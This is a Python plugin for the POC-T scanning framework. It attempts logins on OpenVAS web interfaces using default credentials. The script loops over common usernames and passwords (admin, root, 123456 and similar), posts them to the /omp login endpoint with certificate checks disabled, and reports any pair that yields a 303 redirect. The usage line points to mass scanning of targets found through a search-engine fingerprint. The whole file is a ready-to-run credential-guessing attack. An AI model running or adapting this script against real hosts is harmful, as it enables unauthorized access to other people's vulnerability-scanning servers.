#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
OpenVAS 弱口令
Usage：
    python POC-T.py -s OpenVAS-weak-cred -aF fid="F3gSrsPV5zVx+jSgP7Plaw=="

"""

import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


#
def format_url(xstr):
    xstr = str(xstr)
    if "//" not in xstr:
        xstr = "https://" + xstr
    return xstr.rstrip('/')

def poc(url):
    url = format_url(url)
    burp0_url = "%s/omp" % url
    Us = ['admin', 'test', 'root']
    Ps = ['admin', 'test', 'root', '123456', 'admin123', '12345']
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"macOS\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close"}

    for u in Us:
        for p in Ps:
            try:
                burp0_data = {"cmd": "login", "text": "/omp?r=1", "login": u, "password": p}
                r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, allow_redirects=0, timeout=8)
                code = r.status_code
                if 401 == code:
                    continue
                elif 303 == code:
                    ret = "[%s/%s], %s" % (u, p, url)
                    return ret
                else:
                    return False
            except Exception as e:
                return False